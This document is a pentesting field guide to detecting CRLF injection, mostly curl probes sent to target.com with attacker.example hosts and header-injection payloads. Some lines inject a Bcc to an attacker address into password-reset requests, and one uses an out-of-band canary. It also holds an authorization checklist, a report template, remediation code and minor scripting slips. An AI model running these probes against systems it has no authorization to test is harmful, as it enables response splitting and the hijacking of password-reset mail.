# CRLF Injection — Ultimate Advanced Detection Master Reference

> Complete field guide for CRLF injection detection, validation, and exploitation.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Covers HTTP/1.1, HTTP/2, HTTP/3, SMTP, MIME, SSE, and logging sinks.

---

## Quick Detection (via Caido)

```bash
# 1. Basic CRLF probe in query parameter
curl -x "http://localhost:8080" -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# 2. Path parameter probe
curl -x "http://localhost:8080" -i \
  "https://target.com/redirect/%0D%0AX-Injected%3A%20true"

# 3. Header probe (X-Forwarded-Host, X-Original-URL, Referer, etc.)
curl -x "http://localhost:8080" -i \
  -H "X-Forwarded-Host: attacker.example%0D%0AX-Injected%3A%20true" \
  "https://target.com/"

# 4. Cookie probe
curl -x "http://localhost:8080" -i \
  -H "Cookie: session=test%0D%0AX-Injected%3A%20true" \
  "https://target.com/"

# 5. POST body probe (JSON)
curl -x "http://localhost:8080" -i -X POST \
  -H "Content-Type: application/json" \
  -d '{"redirect": "https://attacker.example%0D%0AX-Injected%3A%20true"}' \
  "https://target.com/api/redirect"

# 6. Multipart filename probe
curl -x "http://localhost:8080" -i -X POST \
  -F "file=@/tmp/test.txt;filename=test%0D%0AX-Injected%3A%20true.txt" \
  "https://target.com/upload"

# 7. SMTP/Email probe (password reset, contact forms)
curl -x "http://localhost:8080" -i -X POST \
  -d "email=victim@example.com%0D%0ABcc%3A%20attacker%40example.com" \
  "https://target.com/password-reset"
```

**Marker Strategy**: Always use unique harmless markers like `X-CRLF-Probe: CRLF-2026-UNIQUE-ID`

---

## PART I — ADVANCED DETECTION PRINCIPLES

### CRLF Vulnerability Model (Source-to-Sink)

```
ATTACKER INPUT
    |
    v
INPUT PARSER
    |
    v
DECODING / CANONICALIZATION
    |
    v
APPLICATION VALIDATION
    |
    v
BUSINESS LOGIC
    |
    v
DATA PROPAGATION
    |
    v
PROTOCOL FIELD CONSTRUCTION
    |
    v
SERIALIZATION
    |
    v
WIRE REPRESENTATION
    |
    v
DOWNSTREAM PARSER
    |
    v
STRUCTURAL INTERPRETATION
    |
    v
SECURITY CONSEQUENCE
```

**A vulnerability is confirmed only when:**
1. Attacker input reaches a protocol-sensitive sink
2. Transformation chain allows CRLF to survive
3. Independent protocol field/message boundary is created
4. Downstream parser interprets the structural change
5. Security consequence is demonstrated

---

## PART II — SOURCE DISCOVERY

### 2.1 URL-Based Sources (via Caido)
```bash
# Query parameters
curl -x "http://localhost:8080" -i "https://target.com/redirect?url=payload"

# Path parameters
curl -x "http://localhost:8080" -i "https://target.com/redirect/payload"

# Path segments
curl -x "http://localhost:8080" -i "https://target.com/api/payload/action"

# Fragments (if client-side sends to server)
# redirect, return, callback, next, url, uri, link, target, destination
```

### 2.2 Request-Based Sources (via Caido)
```bash
# Custom headers that reach sinks
curl -x "http://localhost:8080" -i \
  -H "X-Forwarded-Host: payload" \
  -H "X-Original-URL: payload" \
  -H "X-Rewrite-URL: payload" \
  -H "Referer: payload" \
  -H "Origin: payload" \
  -H "User-Agent: payload" \
  -H "X-Forwarded-For: payload" \
  "https://target.com/"

# Cookies
curl -x "http://localhost:8080" -i -H "Cookie: session=payload" "https://target.com/"
```

### 2.3 Body-Based Sources (via Caido)
```bash
# JSON
curl -x "http://localhost:8080" -i -X POST -H "Content-Type: application/json" \
  -d '{"url": "payload", "redirect": "payload"}' "https://target.com/api/"

# Form
curl -x "http://localhost:8080" -i -X POST \
  -d "redirect=payload&next=payload" "https://target.com/"

# Multipart (filenames, field names)
curl -x "http://localhost:8080" -i -F "file=@/tmp/test.txt;filename=payload.txt" "https://target.com/upload"

# XML/SOAP
curl -x "http://localhost:8080" -i -H "Content-Type: application/xml" \
  -d '<redirect>payload</redirect>' "https://target.com/api/"
```

### 2.4 Stateful Sources
```bash
# Stored values that reach sinks in different workflows
# Profile fields, email, display name, organization, saved redirects
# Webhook configs, API settings, template configs
# Test: Set value in profile -> Trigger notification -> Check headers
```

### 2.5 Indirect Sources
```bash
# External APIs, webhooks, OAuth providers, SSO
# URL preview services, file conversion, image processing
# Background workers, message queues, third-party integrations
```

---

## PART III — SINK DISCOVERY

### 3.1 HTTP Response-Header Sinks (via Caido)
```bash
# Test each sink with unique marker
SINKS=("Location" "Set-Cookie" "Content-Disposition" "Content-Type" 
       "Link" "Refresh" "WWW-Authenticate" "Access-Control-Allow-Origin"
       "Access-Control-Expose-Headers" "Content-Security-Policy"
       "Strict-Transport-Security" "Cache-Control" "Vary")

for sink in "${SINKS[@]}"; do
  echo "Testing $sink..."
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true" | \
    grep -i "$sink"
done
```

### 3.2 HTTP Request-Header Sinks (Outbound)
```bash
# Webhooks, API integrations, URL preview, PDF generation, imports
# Test: Does attacker-controlled data reach outbound headers?
curl -x "http://localhost:8080" -i \
  -H "X-Forwarded-Host: attacker.example%0D%0AX-Injected%3A%20true" \
  "https://target.com/webhook"
```

### 3.3 Non-HTTP Sinks
```bash
# SMTP headers (email reset, contact forms)
curl -x "http://localhost:8080" -i -X POST \
  -d "email=victim@example.com%0D%0ABcc%3A%20attacker%40example.com" \
  "https://target.com/password-reset"

# MIME headers (file upload, Content-Disposition)
curl -x "http://localhost:8080" -i -F "file=@/tmp/test.txt;filename=test%0D%0AX-Injected.txt" \
  "https://target.com/upload"

# SSE fields (event, data, id, retry)
curl -x "http://localhost:8080" -i \
  "https://target.com/events?data=payload%0D%0Aevent%3A%20injected"

# Log injection
curl -x "http://localhost:8080" -i "https://target.com/search?q=payload%0D%0AFAKE_LOG_ENTRY"
```

---

## PART IV — TRANSFORMATION ANALYSIS

### 4.1 Multi-Stage Decoding Testing

| Representation | Decoding Stages | Test Purpose |
|----------------|-----------------|--------------|
| `%0D%0A` | 1 | Single URL decode |
| `%250D%250A` | 2 | Double URL decode |
| `%25250D%25250A` | 3 | Triple URL decode |
| `%0D%0A` (literal) | 0 | Raw input handling |
| `%0D%0A` + Unicode | 1+ | Unicode normalization |

```bash
# Test all encoding depths
PAYLOADS=(
  "%0D%0A"
  "%250D%250A"
  "%25250D%25250A"
  "%0D%0A"
)

for p in "${PAYLOADS[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    "https://target.com/redirect?url=https://attacker.example${p}X-Injected%3A%20true" | \
    grep -i "x-injected"
done
```

### 4.2 Validation-Order Analysis

Investigate the validation design:

| Design | Order | Risk |
|--------|-------|------|
| A | Decode → Validate → Serialize | Safe if validation is complete |
| B | Validate → Decode → Serialize | **High** - validation sees encoded, decode after |
| C | Decode → Validate → Transform → Serialize | **High** - transformation after validation |
| D | Decode → Validate → Encode → Decode → Serialize | **Critical** - double decode after validation |
| E | Decode → App → Library → Header → Serialize | **High** - library vs app differences |

```bash
# Test for Design B (validate before decode)
# Send encoded payload that passes validation but decodes to CRLF
curl -x "http://localhost:8080" -i \
  "https://target.com/redirect?url=https://attacker.example%250D%250AX-Injected%3A%20true"
```

---

## PART V — PROTOCOL DIFFERENTIAL TESTING

### 5.1 HTTP/1.1 vs HTTP/2 vs HTTP/3 (via Caido)

```bash
# HTTP/1.1
curl -x "http://localhost:8080" --http1.1 -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# HTTP/2
curl -x "http://localhost:8080" --http2 -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# HTTP/3 (if supported)
curl -x "http://localhost:8080" --http3 -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"
```

### 5.2 Proxy/Intermediary Differentials

```bash
# Test through different paths
# Direct to origin (if accessible)
# Through CDN
# Through WAF
# Through load balancer

# Check for header translation discrepancies
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Forwarded-Host: attacker.example%0D%0AX-Injected%3A%20true" \
  "https://target.com/" | grep -i "x-injected"

# Compare HTTP versions
for version in --http1.1 --http2; do
  echo "Testing $version"
  curl -x "http://localhost:8080" $version -sS -D - -o /dev/null \
    "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true" | \
    grep -i "x-injected"
done
```

---

## PART VI — TECHNOLOGY-SPECIFIC DETECTION

### 6.1 Node.js (Express, Fastify, Koa)
```bash
# Check for raw header construction
# res.setHeader('Location', userInput)  # Vulnerable
# res.redirect(userInput)  # May be vulnerable

# Test redirect endpoints
curl -x "http://localhost:8080" -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"
```

### 6.2 Java (Spring, Servlet, Netty)
```bash
# response.sendRedirect(userInput)  # Vulnerable in older versions
# response.setHeader("Location", userInput)  # Vulnerable
# response.addHeader("Set-Cookie", userInput)  # Vulnerable

# Test all redirect endpoints
curl -x "http://localhost:8080" -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"
```

### 6.3 Python (Django, Flask, FastAPI, Starlette)
```bash
# Flask: redirect(userInput), make_response().headers['Location'] = userInput
# Django: HttpResponseRedirect(userInput), response['Location'] = userInput
# FastAPI: RedirectResponse(userInput), response.headers['Location'] = userInput

curl -x "http://localhost:8080" -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"
```

### 6.4 Go (net/http, Gin, Echo, Fiber)
```bash
# http.Redirect(w, r, userInput, 302)
# w.Header().Set("Location", userInput)
# c.Redirect(302, userInput)  # Gin

curl -x "http://localhost:8080" -i \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"
```

---

## PART VII — BUSINESS LOGIC WORKFLOWS

### 7.1 Workflow-Based Testing
```bash
# Workflow A: Redirect processing
# 1. User input -> 2. Validation -> 3. Storage -> 4. Location serialization
curl -x "http://localhost:8080" -i "https://target.com/redirect?return=payload"

# Workflow B: File upload
# 1. Filename -> 2. Multipart parser -> 3. Storage -> 4. Content-Disposition
curl -x "http://localhost:8080" -i -F "file=@test.txt;filename=payload.txt" "https://target.com/upload"

# Workflow C: Account/Profile
# 1. Profile field -> 2. Database -> 3. Notification -> 4. Header/Email
# Set profile field -> Trigger email -> Check email headers

# Workflow D: Webhook config
# 1. Webhook URL -> 2. Storage -> 3. Background worker -> 4. Outbound request
# Configure webhook -> Trigger event -> Check outbound request headers

# Workflow E: OAuth/SSO
# 1. Callback params -> 2. Auth middleware -> 3. Redirect -> 4. Cookie
curl -x "http://localhost:8080" -i "https://target.com/oauth/callback?redirect_uri=payload"

# Workflow F: Notifications
# 1. User metadata -> 2. Template -> 3. Email -> 4. MIME headers
# Check email headers for injected fields

# Workflow G: SSE
# 1. User data -> 2. Event object -> 3. SSE encoder -> 4. Stream
curl -x "http://localhost:8080" -i "https://target.com/events?data=payload"

# Workflow H: Logging
# 1. Request input -> 2. App logging -> 3. Log formatter -> 4. SIEM
curl -x "http://localhost:8080" -i "https://target.com/search?q=payload%0D%0AFAKE_LOG"
```

---

## PART VIII — SYSTEMATIC TEST MATRIX

### 8.1 Controlled Marker Strategy

```bash
# Generate unique marker for each test
MARKER="X-CRLF-Probe: CRLF-$(date +%s)-$(shuf -i 1000-9999 -n 1)"
ENCODED_MARKER=$(echo -n "$MARKER" | sed 's/%/%25/g; s/ /%20/g; s/:/%3A/g; s/\n/%0A/g; s/\r/%0D/g')

# Test with unique marker per parameter
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%0D%0A${ENCODED_MARKER}" | \
  grep -i "$(echo "$MARKER" | cut -d: -f1)"
```

### 8.2 Differential Testing

```bash
# Capture baseline
BASELINE=$(curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/redirect?url=https://attacker.example")

# Test with CRLF
TEST=$(curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true")

# Compare
diff <(echo "$BASELINE") <(echo "$TEST")

# Look for:
# - New header lines
# - Header value changes
# - Status line changes
# - Body length changes
# - New blank line position
```

---

## PART IX — BLIND AND INDIRECT DETECTION

### 9.1 Blind Sink Investigation
```bash
# Use interactsh for out-of-band confirmation
interactsh-client -v -json -o canary.log &
sleep 3
CANARY=$(grep -oE "[a-z0-9]+\.interact\.sh" canary.log | head -1)

# Deploy canary to suspected blind sinks
curl -x "http://localhost:8080" -i \
  "https://target.com/webhook?url=http://${CANARY}%0D%0AX-Injected%3A%20true"

# Background email delivery
curl -x "http://localhost:8080" -i -X POST \
  -d "email=victim%40example.com%0D%0ABcc%3A%20${CANARY}" \
  "https://target.com/password-reset"

# Check canary.log for interactions
```

### 9.2 Timing and Error Differentials
```bash
# Compare response times and errors
for payload in "" "%0D%0A" "%250D%250A" "%0D%0A%0D%0A"; do
  curl -x "http://localhost:8080" -w "time=%{time_total} size=%{size_download} code=%{http_code}\n" \
    -sS -D - -o /dev/null \
    "https://target.com/redirect?url=https://attacker.example${payload}"
done
```

---

## PART X — FALSE POSITIVE ELIMINATION

| FP Type | Indicator | Verification |
|---------|-----------|--------------|
| Body reflection | Marker in HTML/JSON | Not header injection |
| Encoded in header | Literal `%0D%0A` in value | No delimiter interpretation |
| Request-header reflection | Marker in request echo | Check direction |
| Normal header | Existed in baseline | Compare with baseline |
| WAF block | Block page returned | No injection proof |
| Framework reject | Input rejected | Rejection ≠ vulnerability |
| Header modification | Existing value modified | Check field semantics |
| Duplicate header | Duplicate observed | Check causality |

---

## PART XI — EVIDENCE & CONFIDENCE

### 10.1 Evidence Levels

| Level | Description |
|-------|-------------|
| E0 | Input accepted |
| E1 | Reflected in response |
| E2 | Candidate sink reached |
| E3 | Sink reachability confirmed |
| E4 | **Independent field created** |
| E5 | Downstream parser interpretation |
| E6 | Security consequence demonstrated |

**E4+ required for confirmed finding**

### 10.2 Confidence Scoring

| Evidence | Points |
|----------|--------|
| Attacker-controlled source | 10 |
| Transformation chain identified | 10 |
| Sink identified | 15 |
| Serializer behavior established | 15 |
| Independent field demonstrated | 20 |
| Downstream interpretation | 15 |
| Reproduction confirmed | 10 |
| Security consequence | 5 |
| **Max** | **100** |

**≥75 = Strongly confirmed**

---

## PART XII — ESCALATION VALIDATION

| Consequence | Required Evidence |
|-------------|-------------------|
| Header manipulation | Independent field creation |
| Cookie manipulation | Cookie parsed and accepted |
| Session fixation | Session behavior demonstrated |
| Open redirect | Destination controlled |
| Content-type manipulation | Downstream interpretation change |
| XSS | Script execution in controlled context |
| Response splitting | Multiple messages interpreted |
| Cache poisoning | Shared-cache behavior in isolation |
| Request smuggling | Parser disagreement + boundary impact |
| SMTP injection | Serialized email structure changed |
| SSE event forgery | Separate event parsed by controlled client |
| Log forging | Log consumer interprets forged record |

---

## PART XIII — TOOLKIT

### 13.1 Burp Suite
- Proxy history → Repeater → Comparer
- Single parameter modification
- Raw response comparison

### 13.2 curl (via Caido)
```bash
# Baseline
curl -x "http://localhost:8080" --http1.1 -i "https://target.com/redirect?url=https://attacker.example"

# Test
curl -x "http://localhost:8080" --http1.1 -i "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# Separate headers/body
curl -x "http://localhost:8080" -D headers.txt -o body.txt "https://target.com/..."

# HTTP/2
curl -x "http://localhost:8080" --http2 -i "https://target.com/..."
```

### 13.3 mitmproxy
```bash
# Intermediary behavior observation
mitmproxy --mode upstream:http://localhost:8080
```

### 13.4 Automated Tools
- `crlfuzz` - CRLF-specific fuzzer
- `nuclei` - Template-based detection
- Custom source-to-sink analyzers

---

## PART XIV — REPORTING TEMPLATE

```
TITLE: CRLF Injection in [Endpoint] Allows [Structural Effect]

SUMMARY:
Attacker-controlled value in [parameter] reaches [sink] via [transformation chain].
Testing demonstrated [exact structural change].

AFFECTED:
- Endpoint: [URL]
- Parameter: [name, location]
- Sink: [header/field name]
- Protocol: [HTTP/1.1, HTTP/2, SMTP, MIME, SSE]

REPRODUCTION:
1. Baseline: [request/response]
2. Test: [exact request with marker]
3. Result: [structural change observed]
4. Downstream: [parser interpretation]

EVIDENCE:
- baseline-request.txt
- baseline-response.txt
- test-request.txt
- test-response.txt
- raw-diff.txt
- evidence.json

IMPACT:
[Only demonstrated impact, no speculation]

REMEDIATION:
- Reject CR, LF, NUL in field values
- Use framework header APIs
- Validate after decoding, before serialization
- Consistent validation across intermediaries
```

---

## PART XV — CHECKLIST

### Pre-Test
- [ ] Target authorized
- [ ] Scope confirmed
- [ ] Baseline captured
- [ ] Unique markers generated

### Source Discovery
- [ ] Query params
- [ ] Path params
- [ ] Headers
- [ ] Cookies
- [ ] Body fields (JSON, form, multipart, XML)
- [ ] Stored values
- [ ] External inputs

### Transformation Analysis
- [ ] URL decoding depth
- [ ] Unicode normalization
- [ ] Validation order
- [ ] Character-set conversion

### Sink Discovery
- [ ] Response headers
- [ ] Outbound request headers
- [ ] Redirect/cookie workflows
- [ ] MIME/SSE/log sinks

### Protocol Differentials
- [ ] HTTP/1.1
- [ ] HTTP/2
- [ ] HTTP/3
- [ ] Proxy paths

### Evidence
- [ ] Baseline preserved
- [ ] Independent field verified
- [ ] Raw response inspected
- [ ] Reproduction confirmed
- [ ] False positives eliminated

---

## PART XVI — REMEDIATION

```javascript
// Header validation middleware
function validateHeaders(req, res, next) {
  const forbidden = /[\r\n\x00]/;
  
  // Check all user-controlled values before header setting
  const checkValue = (val) => {
    if (typeof val === 'string' && forbidden.test(val)) {
      throw new Error('CRLF injection attempt detected');
    }
  };
  
  // Apply to known sinks
  ['location', 'set-cookie', 'content-disposition', 'content-type'].forEach(header => {
    const original = res.setHeader.bind(res);
    res.setHeader = (name, value) => {
      if (name.toLowerCase() === header.toLowerCase()) checkValue(value);
      original(name, value);
    };
  });
  
  next();
}

// Use framework header APIs, never raw string construction
// res.setHeader('Location', userInput)  // Safe - framework validates
// res.writeHead(302, 'Location: ' + userInput)  // UNSAFE - raw construction
```

---

> **Remember**: A reflected CRLF is not a vulnerability. An independently interpreted protocol field by a downstream parser IS.
> Always validate in the actual protocol context (HTTP/1.1, HTTP/2, SMTP, MIME, SSE).
> Document the exact transformation chain and downstream parser behavior.